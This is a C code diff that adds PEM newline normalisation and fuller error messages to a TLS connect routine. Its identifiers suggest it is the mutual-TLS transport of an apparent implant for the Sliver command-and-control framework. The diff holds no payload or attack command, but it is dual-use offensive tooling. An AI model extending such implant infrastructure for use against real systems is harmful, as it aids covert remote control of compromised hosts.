@@ -71,6 +71,59 @@ static void set_err(char *err, size_t err_len, const char *msg) {
   }
 }
 
+/* PEM blobs travel through config.json -> CMake -> a C string literal. Depending
+ * on the tool chain that produced them the newlines can arrive either as real
+ * newlines or as a literal backslash-n sequence; mbedTLS only accepts the
+ * former. Normalise both forms (and \r) before parsing. */
+static char *normalize_pem(const char *pem) {
+  size_t len;
+  char *out;
+  size_t o = 0;
+  int has_real_newline = 0;
+
+  if (pem == NULL) {
+    return NULL;
+  }
+  len = strlen(pem);
+  for (size_t i = 0; i < len; ++i) {
+    if (pem[i] == '\n') {
+      has_real_newline = 1;
+      break;
+    }
+  }
+  out = (char *)malloc(len + 1);
+  if (out == NULL) {
+    return NULL;
+  }
+  for (size_t i = 0; i < len; ++i) {
+    char c = pem[i];
+    if (c == '\\' && i + 1 < len) {
+      char n = pem[i + 1];
+      if (n == 'n') {
+        out[o++] = '\n';
+        i++;
+        continue;
+      }
+      if (n == 'r') {
+        out[o++] = '\r';
+        i++;
+        continue;
+      }
+      if (n == '\\') {
+        out[o++] = '\\';
+        i++;
+        continue;
+      }
+    }
+    if (!has_real_newline && c == '\r') {
+      continue;
+    }
+    out[o++] = c;
+  }
+  out[o] = '\0';
+  return out;
+}
+
 static int bio_send(void *ctx, const unsigned char *buf, size_t len) {
   sliver_tls_t *conn = (sliver_tls_t *)ctx;
   long n = sliver_socket_send(conn->sock, buf, len);
@@ -162,23 +215,59 @@ int sliver_tls_connect(sliver_tls_t **out, const char *host, uint16_t port,
     tls_free(conn);
     return -1;
   }
-  if ((rc = mbedtls_x509_crt_parse(&conn->ca, (const unsigned char *)ca_pem,
-                                   strlen(ca_pem) + 1)) != 0) {
-    set_err(err, err_len, "tls: cannot parse CA certificate");
-    tls_free(conn);
-    return -1;
-  }
-  if ((rc = mbedtls_x509_crt_parse(&conn->cert, (const unsigned char *)cert_pem,
-                                   strlen(cert_pem) + 1)) != 0) {
-    set_err(err, err_len, "tls: cannot parse client certificate");
-    tls_free(conn);
-    return -1;
-  }
-  if ((rc = mbedtls_pk_parse_key(&conn->key, (const unsigned char *)key_pem,
-                                 strlen(key_pem) + 1, NULL, 0, rng_adapter, NULL)) != 0) {
-    set_err(err, err_len, "tls: cannot parse client key");
-    tls_free(conn);
-    return -1;
+  {
+    char *ca = normalize_pem(ca_pem);
+    char *cert = normalize_pem(cert_pem);
+    char *key = normalize_pem(key_pem);
+    int parse_rc;
+
+    if (ca == NULL || cert == NULL || key == NULL) {
+      free(ca);
+      free(cert);
+      free(key);
+      set_err(err, err_len, "tls: out of memory while normalising PEM");
+      tls_free(conn);
+      return -1;
+    }
+    parse_rc = mbedtls_x509_crt_parse(&conn->ca, (const unsigned char *)ca, strlen(ca) + 1);
+    if (parse_rc != 0) {
+      if (err != NULL) {
+        (void)snprintf(err, err_len,
+                       "tls: cannot parse CA certificate (rc=-0x%04x, %u bytes, starts '%.24s')",
+                       -parse_rc, (unsigned)strlen(ca), ca);
+      }
+      free(ca);
+      free(cert);
+      free(key);
+      tls_free(conn);
+      return -1;
+    }
+    parse_rc = mbedtls_x509_crt_parse(&conn->cert, (const unsigned char *)cert, strlen(cert) + 1);
+    if (parse_rc != 0) {
+      if (err != NULL) {
+        (void)snprintf(err, err_len, "tls: cannot parse client certificate (rc=-0x%04x)", -parse_rc);
+      }
+      free(ca);
+      free(cert);
+      free(key);
+      tls_free(conn);
+      return -1;
+    }
+    parse_rc = mbedtls_pk_parse_key(&conn->key, (const unsigned char *)key, strlen(key) + 1,
+                                    NULL, 0, rng_adapter, NULL);
+    if (parse_rc != 0) {
+      if (err != NULL) {
+        (void)snprintf(err, err_len, "tls: cannot parse client key (rc=-0x%04x)", -parse_rc);
+      }
+      free(ca);
+      free(cert);
+      free(key);
+      tls_free(conn);
+      return -1;
+    }
+    free(ca);
+    free(cert);
+    free(key);
   }
 
   if ((rc = mbedtls_ssl_config_defaults(&conn->conf, MBEDTLS_SSL_IS_CLIENT,
